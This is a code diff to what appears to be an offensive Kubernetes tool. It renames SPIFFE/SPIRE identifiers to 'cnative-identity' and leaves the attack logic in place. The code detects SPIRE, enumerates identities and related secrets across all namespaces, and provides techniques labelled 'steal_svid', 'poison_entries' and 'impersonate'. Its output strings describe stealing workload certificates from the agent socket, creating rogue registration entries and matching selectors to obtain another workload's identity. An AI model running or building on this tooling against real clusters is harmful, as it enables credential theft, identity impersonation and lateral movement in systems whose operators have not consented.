@@ -11,7 +11,7 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var spiffeIDGVR = schema.GroupVersionResource{
+var cnativeIdentityIDGVR = schema.GroupVersionResource{
 	Group: "spiffeid.spiffe.io", Version: "v1beta1", Resource: "spiffeids",
 }
 
@@ -19,7 +19,7 @@ var clusterSPIFFEIDGVR = schema.GroupVersionResource{
 	Group: "spire.spiffe.io", Version: "v1alpha1", Resource: "clusterspiffeids",
 }
 
-func detectSPIFFE(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) []DetectionSystem {
+func detectCnativeIdentity(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) []DetectionSystem {
 	namespaces := []string{"spire", "spire-system", "spire-server"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -27,7 +27,7 @@ func detectSPIFFE(ctx context.Context, client kubernetes.Interface, dynClient dy
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "spiffe/spire",
+				Name:      "cnative-identity",
 				Detected:  true,
 				Namespace: ns,
 				Details:   fmt.Sprintf("%d spire-server pods", len(pods.Items)),
@@ -39,7 +39,7 @@ func detectSPIFFE(ctx context.Context, client kubernetes.Interface, dynClient dy
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "spiffe/spire",
+				Name:      "cnative-identity",
 				Detected:  true,
 				Namespace: ns,
 				Details:   fmt.Sprintf("%d spire-agent pods", len(pods.Items)),
@@ -47,10 +47,10 @@ func detectSPIFFE(ctx context.Context, client kubernetes.Interface, dynClient dy
 		}
 	}
 
-	ids, err := dynClient.Resource(spiffeIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(ids.Items) > 0 {
 		return []DetectionSystem{{
-			Name:     "spiffe/spire",
+			Name:     "cnative-identity",
 			Detected: true,
 			Details:  fmt.Sprintf("%d SPIFFE ID CRDs found", len(ids.Items)),
 		}}
@@ -59,25 +59,25 @@ func detectSPIFFE(ctx context.Context, client kubernetes.Interface, dynClient dy
 	return nil
 }
 
-// ExploitSPIFFE executes the specified SPIFFE/SPIRE exploitation technique.
-func ExploitSPIFFE(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeIdentity executes the specified cnative-identity exploitation technique.
+func ExploitCnativeIdentity(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return spiffeEnumerate(ctx, client, dynClient)
+		return cnativeIdentityEnumerate(ctx, client, dynClient)
 	case "steal_svid":
-		return spiffeStealSVID(ctx, client)
+		return cnativeIdentityStealSVID(ctx, client)
 	case "poison_entries":
-		return spiffePoisonEntries(ctx, dynClient)
+		return cnativeIdentityPoisonEntries(ctx, dynClient)
 	case "impersonate":
-		return spiffeImpersonate(ctx, client, dynClient)
+		return cnativeIdentityImpersonate(ctx, client, dynClient)
 	default:
-		return spiffeEnumerate(ctx, client, dynClient)
+		return cnativeIdentityEnumerate(ctx, client, dynClient)
 	}
 }
 
-func spiffeEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeIdentityEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("SPIFFE/SPIRE Enumeration:\n\n")
+	sb.WriteString("cnative-identity Enumeration:\n\n")
 
 	namespaces := []string{"spire", "spire-system", "spire-server"}
 	found := false
@@ -92,7 +92,7 @@ func spiffeEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 		}
 	}
 
-	ids, err := dynClient.Resource(spiffeIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(ids.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "\n  SPIFFE IDs (%d):\n", len(ids.Items))
@@ -116,22 +116,22 @@ func spiffeEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 
 	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
 	if err == nil {
-		spireSecrets := 0
+		cnativeIdentitySecrets := 0
 		for _, s := range secrets.Items {
 			if strings.Contains(s.Name, "spire") || strings.Contains(s.Name, "spiffe") {
-				spireSecrets++
-				if spireSecrets <= 5 {
+				cnativeIdentitySecrets++
+				if cnativeIdentitySecrets <= 5 {
 					fmt.Fprintf(&sb, "  Secret: %s/%s (type=%s)\n", s.Namespace, s.Name, s.Type)
 				}
 			}
 		}
-		if spireSecrets > 5 {
-			fmt.Fprintf(&sb, "  ... and %d more SPIRE-related secrets\n", spireSecrets-5)
+		if cnativeIdentitySecrets > 5 {
+			fmt.Fprintf(&sb, "  ... and %d more cnative-identity secrets\n", cnativeIdentitySecrets-5)
 		}
 	}
 
 	if !found {
-		sb.WriteString("  No SPIFFE/SPIRE components detected\n")
+		sb.WriteString("  No cnative-identity components detected\n")
 	}
 
 	return &EvasionResult{
@@ -141,11 +141,11 @@ func spiffeEnumerate(ctx context.Context, client kubernetes.Interface, dynClient
 	}, nil
 }
 
-func spiffeStealSVID(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeIdentityStealSVID(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("SPIFFE SVID Theft:\n\n")
 
-	sb.WriteString("  SPIRE agents expose the Workload API via Unix domain socket.\n")
+	sb.WriteString("  cnative-identity agents expose the Workload API via Unix domain socket.\n")
 	sb.WriteString("  Default path: /run/spire/sockets/agent.sock\n\n")
 
 	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
@@ -198,14 +198,14 @@ func spiffeStealSVID(ctx context.Context, client kubernetes.Interface) (*Evasion
 	}, nil
 }
 
-func spiffePoisonEntries(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeIdentityPoisonEntries(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("SPIFFE Registration Entry Poisoning:\n\n")
+	sb.WriteString("cnative-identity Registration Entry Poisoning:\n\n")
 
-	sb.WriteString("  SPIRE registration entries map workload selectors to SPIFFE IDs.\n")
+	sb.WriteString("  cnative-identity registration entries map workload selectors to SPIFFE IDs.\n")
 	sb.WriteString("  Creating rogue entries grants our workload a trusted identity.\n\n")
 
-	ids, err := dynClient.Resource(spiffeIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list SPIFFE IDs: %v\n", err)
 		sb.WriteString("  SPIFFE CRDs may not be installed\n")
@@ -238,18 +238,18 @@ func spiffePoisonEntries(ctx context.Context, dynClient dynamic.Interface) (*Eva
 	}, nil
 }
 
-func spiffeImpersonate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeIdentityImpersonate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("SPIFFE Identity Impersonation:\n\n")
+	sb.WriteString("cnative-identity Impersonation:\n\n")
 
-	ids, err := dynClient.Resource(spiffeIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	ids, err := dynClient.Resource(cnativeIdentityIDGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot enumerate SPIFFE IDs: %v\n", err)
 		return &EvasionResult{Technique: "impersonate", Success: false, Output: sb.String()}, nil
 	}
 
 	sb.WriteString("  Workload selectors determine which pods get which SPIFFE ID.\n")
-	sb.WriteString("  If we match a selector, SPIRE issues us that workload's identity.\n\n")
+	sb.WriteString("  If we match a selector, cnative-identity issues us that workload's identity.\n\n")
 
 	targets := 0
 	for _, id := range ids.Items {
@@ -283,7 +283,7 @@ func spiffeImpersonate(ctx context.Context, client kubernetes.Interface, dynClie
 	}
 
 	sb.WriteString("\n  Impersonation techniques:\n")
-	sb.WriteString("    1. Match workload selector labels → SPIRE issues SVID automatically\n")
+	sb.WriteString("    1. Match workload selector labels → cnative-identity issues SVID automatically\n")
 	sb.WriteString("    2. Deploy pod in same namespace/service account as target\n")
 	sb.WriteString("    3. Use node attestation — pods on same node share agent trust\n")
 	sb.WriteString("    4. Modify target's SPIFFE ID CRD to include broader selectors\n")
